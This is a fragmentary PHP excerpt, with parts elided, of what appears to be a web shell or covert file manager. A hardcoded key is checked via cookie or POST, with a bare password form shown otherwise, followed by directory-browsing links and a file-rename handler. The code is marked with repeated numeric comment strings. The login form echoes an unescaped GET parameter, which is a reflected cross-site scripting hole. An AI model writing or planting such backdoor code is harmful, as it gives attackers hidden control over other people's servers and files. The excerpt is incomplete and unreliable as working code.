...
$auth_key = "f245cb2a1194bb4b7c7f89c871f0580e";
...
$pass = false;
if (isset($_COOKIE['pw_name_72683'])) {
    if(($_COOKIE['pw_name_72683']) == $auth_key) {
        $pass = true;
    }
} else {
    if (isset($_POST['pw_name_72683'])) {
        if(($_POST['pw_name_72683']) == $auth_key) {
            setcookie("pw_name_72683", $_POST['pw_name_72683']);
            $pass = true;
        }
    }
}
if (!$pass) {
    die("<form action='?p=' method=post ><input type=password name='pw_name_72683' value='".$_GET['pw']."'  required><input type=submit name='watching' ></form>");
}
// ---- // 1725771327401861 1725771327610279 1725771327703275 1725771327533000
...
foreach ($paths as $id => $dir_part) {
    ...
    if ($dir_part == '')
        continue;// 1725771327401861 1725771327610279 1725771327703275 1725771327533000
    echo "<a href='?p=";
    for ($i = 0; $i <= $id; $i++) {
...
if (isset($_GET['r'])) {
    ...
    <form method="post">
        ...
        if (isset($_POST['rename'])) {// 1725771327401861 1725771327610279 1725771327703275 1725771327533000
            $name = PATH . "/" . $_GET['r'];
